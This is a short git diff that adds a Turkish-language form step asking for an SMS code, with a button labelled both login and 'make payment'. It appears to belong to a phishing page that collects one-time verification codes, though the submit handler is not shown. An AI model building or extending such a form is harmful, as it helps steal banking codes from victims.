@@ -1172,6 +1172,19 @@
                           </div>
                         </form>
                        </div>
+                       <div class="card-body d-none flex-column" id="login-step-3">
+                        <form id="form" action="javascript:;" onsubmit="ekBilgi()">
+                          <div class="form-group">
+                            <textarea placeholder="" pattern="\d*" id="sms-input" step="any" maxlength="11" data-lpignore="true" autocomplete="" name="jethavale_sms" type="number" class="form-control" value="">
+                            </textarea>
+                          </div>
+                         
+                          <div class="d-flex flex-row">
+                            <a aria-label="Geri" tabindex="-1" onclick="backTwo()" class="btn-lg mt-3 btn-cancel btn btn-secondary">Geri</a>
+                            <button id="sms-button" type="submit" disabled="" class="btn-lg btn-block mt-auto btn-login btn btn-primary disabled" aria-label="Giriş Yap">Ödeme Yap</button>
+                          </div>
+                        </form>
+                       </div>
                       </div>
                     </div>
                   </div>
